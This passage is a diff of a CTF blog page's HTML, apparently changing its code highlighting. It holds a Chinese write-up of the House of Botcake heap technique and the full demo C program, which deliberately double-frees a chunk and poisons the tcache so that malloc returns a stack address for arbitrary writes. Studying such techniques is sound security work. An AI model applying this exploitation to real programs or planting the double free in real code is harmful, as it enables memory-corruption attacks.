@@ -102,12 +102,12 @@ Arashimuのblog = CTFer</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclx29mstj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicli3sbvtj20zk0m8x6p.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclxfdlttj20zk0m8npd.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipew8gmvyj20zk0m87wh.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclip4jbpj20zk0m87cv.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevarprfj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitspjpbj20zk0m81ky.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclflwv2aj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
         </ul>
       </div>
     </header>
@@ -151,31 +151,154 @@ Arashimuのblog = CTFer</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h1 id="houst_of_botcake"><a class="markdownIt-Anchor" href="#houst_of_botcake">#</a> Houst_of_botcake</h1>
-<h2 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码">#</a> 实验代码</h2>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment">/*</pre></td></tr><tr><td data-num="10"></td><td><pre>     * This attack should bypass the restriction introduced in</pre></td></tr><tr><td data-num="11"></td><td><pre>     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</pre></td></tr><tr><td data-num="12"></td><td><pre>     * If the libc does not include the restriction, you can simply double free the victim and do a</pre></td></tr><tr><td data-num="13"></td><td><pre>     * simple tcache poisoning</pre></td></tr><tr><td data-num="14"></td><td><pre>     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token comment">// disable buffering so _IO_FILE does not interfere with our heap</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token comment">// introduction</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This file demonstrates a powerful tcache poisoning attack by tricking malloc into"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"returning a pointer to an arbitrary location (in this demo, the stack)."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This attack only relies on double free.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token comment">// prepare the target</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token class-name">intptr_t</span> stack_var<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The address we want malloc() to return, namely,"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the target address is %p.\n\n"</span><span class="token punctuation">,</span> stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token comment">// prepare heap layout</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Preparing heap layout"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token class-name">intptr_t</span> <span class="token operator">*</span>x<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">/</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocating a chunk for later consolidation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token class-name">intptr_t</span> <span class="token operator">*</span>prev <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocating the victim chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token class-name">intptr_t</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(0x100): a=%p.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocating a padding to prevent consolidation.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    </pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token comment">// cause chunk overlapping</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Now we are able to cause chunk overlapping"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 1: fill up tcache list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token function">free</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    </pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token function">free</span><span class="token punctuation">(</span>prev<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    </pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>    <span class="token comment">/*VULNERABILITY*/</span></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// a is already freed</span></pre></td></tr><tr><td data-num="61"></td><td><pre>    <span class="token comment">/*VULNERABILITY*/</span></pre></td></tr><tr><td data-num="62"></td><td><pre>    </pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token comment">// simple tcache poisoning</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Launch tcache poisoning"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    <span class="token class-name">intptr_t</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"We simply overwrite victim's fwd pointer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>    b<span class="token punctuation">[</span><span class="token number">0x120</span><span class="token operator">/</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>    </pre></td></tr><tr><td data-num="70"></td><td><pre>    <span class="token comment">// take target out</span></pre></td></tr><tr><td data-num="71"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Now we can cash out the target chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    <span class="token class-name">intptr_t</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The new chunk is at %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>    </pre></td></tr><tr><td data-num="76"></td><td><pre>    <span class="token comment">// sanity check</span></pre></td></tr><tr><td data-num="77"></td><td><pre>    <span class="token function">assert</span><span class="token punctuation">(</span>c<span class="token operator">==</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Got control on target/stack!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    </pre></td></tr><tr><td data-num="80"></td><td><pre>    <span class="token comment">// note</span></pre></td></tr><tr><td data-num="81"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Note:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"In that case, once you have done this exploitation, you can have many arbitary writes very easily."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="84"></td><td><pre></pre></td></tr><tr><td data-num="85"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="86"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>目标：对目标地址任意写，这里的目标地址是 <code>stack_var</code></p>
-<h2 id="分布调试与分析"><a class="markdownIt-Anchor" href="#分布调试与分析">#</a> 分布调试与分析</h2>
-<h3 id="step0"><a class="markdownIt-Anchor" href="#step0">#</a> step0</h3>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">intptr_t</span> <span class="token operator">*</span>x<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">/</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocating a chunk for later consolidation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token class-name">intptr_t</span> <span class="token operator">*</span>prev <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocating the victim chunk."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token class-name">intptr_t</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(0x100): a=%p.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocating a padding to prevent consolidation.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="/images/house_of_botcake/2-1676606562747.png" alt=""></p>
-<p>最后申请的 payload 是为了防止释放 a 的时候 a 和 top chunk 合并</p>
-<h3 id="step1"><a class="markdownIt-Anchor" href="#step1">#</a> step1</h3>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 1: fill up tcache list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token function">free</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="/images/house_of_botcake/3.png" alt=""></p>
-<h3 id="step2"><a class="markdownIt-Anchor" href="#step2">#</a> step2</h3>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><pre><code>unsortedbin
+    <h1 id="houst_of_botcake"><a class="markdownIt-Anchor" href="#houst_of_botcake"></a> Houst_of_botcake</h1>
+<h2 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码</h2>
+<pre class="highlight"><code class="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span>
+
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
+&#123;
+    <span class="hljs-comment">/*
+     * This attack should bypass the restriction introduced in
+     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
+     * If the libc does not include the restriction, you can simply double free the victim and do a
+     * simple tcache poisoning
+     * And thanks to @anton00b and @subwire for the weird name of this technique */</span>
+
+    <span class="hljs-comment">// disable buffering so _IO_FILE does not interfere with our heap</span>
+    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
+    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
+
+    <span class="hljs-comment">// introduction</span>
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This attack only relies on double free.\n&quot;</span>);
+
+    <span class="hljs-comment">// prepare the target</span>
+    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The address we want malloc() to return, namely,&quot;</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);
+
+    <span class="hljs-comment">// prepare heap layout</span>
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Preparing heap layout&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);
+    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];
+    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++)&#123;
+        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+    &#125;
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a chunk for later consolidation&quot;</span>);
+    <span class="hljs-type">intptr_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating the victim chunk.&quot;</span>);
+    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); 
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);
+    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
+    
+    <span class="hljs-comment">// cause chunk overlapping</span>
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we are able to cause chunk overlapping&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 1: fill up tcache list&quot;</span>);
+    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;
+        <span class="hljs-built_in">free</span>(x[i]);
+    &#125;
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);
+    <span class="hljs-built_in">free</span>(a);
+    
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);
+    <span class="hljs-built_in">free</span>(prev);
+    
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);
+    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+    <span class="hljs-comment">/*VULNERABILITY*/</span>
+    <span class="hljs-built_in">free</span>(a);<span class="hljs-comment">// a is already freed</span>
+    <span class="hljs-comment">/*VULNERABILITY*/</span>
+    
+    <span class="hljs-comment">// simple tcache poisoning</span>
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Launch tcache poisoning&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);
+    <span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x120</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);
+    b[<span class="hljs-number">0x120</span>/<span class="hljs-number">8</span><span class="hljs-number">-2</span>] = (<span class="hljs-type">long</span>)stack_var;
+    
+    <span class="hljs-comment">// take target out</span>
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now we can cash out the target chunk.&quot;</span>);
+    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+    <span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The new chunk is at %p\n&quot;</span>, c);
+    
+    <span class="hljs-comment">// sanity check</span>
+    assert(c==stack_var);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got control on target/stack!\n\n&quot;</span>);
+    
+    <span class="hljs-comment">// note</span>
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Note:&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;
+</code></pre>
+<p>目标：对目标地址任意写，这里的目标地址是<code>stack_var</code></p>
+<h2 id="分布调试与分析"><a class="markdownIt-Anchor" href="#分布调试与分析"></a> 分布调试与分析</h2>
+<h3 id="step0"><a class="markdownIt-Anchor" href="#step0"></a> step0</h3>
+<pre class="highlight"><code class="c"> <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];
+<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++)&#123;
+    x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+&#125;
+<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a chunk for later consolidation&quot;</span>);
+<span class="hljs-type">intptr_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating the victim chunk.&quot;</span>);
+<span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); 
+<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);
+<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
+</code></pre>
+<p><img data-src="/images/house_of_botcake/2-1676606562747.png" alt="" /></p>
+<p>最后申请的payload是为了防止释放a的时候a和top chunk合并</p>
+<h3 id="step1"><a class="markdownIt-Anchor" href="#step1"></a> step1</h3>
+<pre class="highlight"><code class="c"> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Step 1: fill up tcache list&quot;</span>);
